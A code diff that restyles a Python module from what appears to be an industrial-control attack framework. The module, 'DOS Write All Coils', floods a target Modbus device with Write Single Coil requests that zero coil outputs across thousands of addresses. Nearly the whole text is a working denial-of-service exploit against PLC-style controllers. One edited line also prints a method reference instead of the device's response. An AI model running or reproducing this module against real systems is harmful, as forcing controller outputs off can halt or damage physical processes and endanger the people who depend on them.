@@ -8,74 +8,94 @@ from System.Core.Modbus import *
 from System.Lib import ipcalc
 
 down = False
+
+
 class Module:
 
+    info = {
+        "Name": "DOS Write All Coils",
+        "Author": ["@enddo"],
+        "Description": "DOS With Write All Coils",
+    }
+    options = {
+        "RHOST": ["", True, "The target IP address"],
+        "RPORT": [502, False, "The port number for modbus protocol"],
+        "UID": ["", True, "Modbus Slave UID."],
+        "Threads": [1, False, "The number of concurrent threads"],
+        "Output": [False, False, "The stdout save in output directory"],
+    }
+    output = ""
 
-	info = {
-		'Name': 'DOS Write All Coils',
-		'Author': ['@enddo'],
-		'Description': ("DOS With Write All Coils"),
+    def exploit(self):
+        moduleName = self.info["Name"]
+        print(
+            bcolors.OKBLUE + "[+]" + bcolors.ENDC + " Module " + moduleName + " Start"
+        )
+        for i in range(int(self.options["Threads"][0])):
+            if self.options["RHOST"][0]:
+                thread = threading.Thread(
+                    target=self.do, args=(self.options["RHOST"][0],)
+                )
+                thread.start()
+                THREADS.append(thread)
+            else:
+                break
+            if down:
+                break
 
-        }
-	options = {
-		'RHOST'		:[''		,True	,'The target IP address'],
-		'RPORT'		:[502		,False	,'The port number for modbus protocol'],
-		'UID'		  :[''		,True	,'Modbus Slave UID.'],
-		'Threads'	:[1		,False	,'The number of concurrent threads'],
-		'Output'	:[False		,False	,'The stdout save in output directory']
-	}	
-	output = ''
+        for thread in THREADS:
+            thread.join()
+        if down:
+            self.printLine(
+                "[-] Modbus is not running on : " + self.options["RHOST"][0],
+                bcolors.WARNING,
+            )
+        if self.options["Output"][0]:
+            open(
+                mainPath
+                + "/Output/"
+                + moduleName
+                + "_"
+                + self.options["RHOST"][0].replace("/", "_")
+                + ".txt",
+                "a",
+            ).write("=" * 30 + "\n" + self.output + "\n\n")
+        self.output = ""
 
-	def exploit(self):
+    def printLine(self, str, color):
+        self.output += str + "\n"
+        if str.find("[+]") != -1:
+            print(str.replace("[+]", color + "[+]" + bcolors.ENDC))
+        elif str.find("[-]") != -1:
+            print(str.replace("[-]", color + "[+]" + bcolors.ENDC))
+        else:
+            print(str)
 
-		moduleName 	= self.info['Name']
-		print(bcolors.OKBLUE + '[+]' + bcolors.ENDC + ' Module ' + moduleName + ' Start')
-		for i in range(int(self.options['Threads'][0])):
-			if(self.options['RHOST'][0]):
-				thread 	= threading.Thread(target=self.do,args=(self.options['RHOST'][0],))
-				thread.start()
-				THREADS.append(thread)
-			else:
-				break
-			if(down):
-				break
-
-		for thread in THREADS:
-			thread.join()
-		if(down):
-			self.printLine('[-] Modbus is not running on : ' + self.options['RHOST'][0],bcolors.WARNING)
-		if(self.options['Output'][0]):
-			open(mainPath + '/Output/' + moduleName + '_' + self.options['RHOST'][0].replace('/','_') + '.txt','a').write('='*30 + '\n' + self.output + '\n\n')
-		self.output 	= ''
-
-	def printLine(self,str,color):
-		self.output += str + '\n'
-		if(str.find('[+]') != -1):
-			print(str.replace('[+]',color + '[+]' + bcolors.ENDC))
-		elif(str.find('[-]') != -1):
-			print(str.replace('[-]',color + '[+]' + bcolors.ENDC))
-		else:
-			print(str)
-
-	def do(self,ip):
-		global down
-		if(down == True):
-			return None
-		for i in range(0xffff):
-			c = connectToTarget(ip,self.options['RPORT'][0])
-			if(c == None):
-				down = True
-				return None
-			try:
-				self.printLine('[+] Write on Address ' + str(int(hex(i|0x1111),16)),bcolors.OKGREEN)
-				ans = c.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU05_Write_Single_Coil(outputAddr=int(hex(i|0x1111),16),outputValue=int('0x0000',16)),timeout=timeout, verbose=0)
-				ans = ModbusADU_Answer(bytes(ans))
-				self.printLine('[+] Response is :',bcolors.OKGREEN)
-				ans.show()
-			except:
-				pass
-			
-		
-				
-
-		
+    def do(self, ip):
+        global down
+        if down:
+            return None
+        for i in range(0xFFFF):
+            c = connectToTarget(ip, self.options["RPORT"][0])
+            if c is None:
+                down = True
+                return None
+            try:
+                self.printLine(
+                    "[+] Write on Address " + str(int(hex(i | 0x1111), 16)),
+                    bcolors.OKGREEN,
+                )
+                ans = c.sr1(
+                    ModbusADU(transId=getTransId(), unitId=int(self.options["UID"][0]))
+                    / ModbusPDU05_Write_Single_Coil(
+                        outputAddr=int(hex(i | 0x1111), 16),
+                        outputValue=int("0x0000", 16),
+                    ),
+                    timeout=timeout,
+                    verbose=0,
+                )
+                ans = ModbusADU_Answer(bytes(ans))
+                self.printLine(f"[+] Response is :{ans.__str__}", bcolors.OKGREEN)
+                ans.show()
+            except:
+                pass
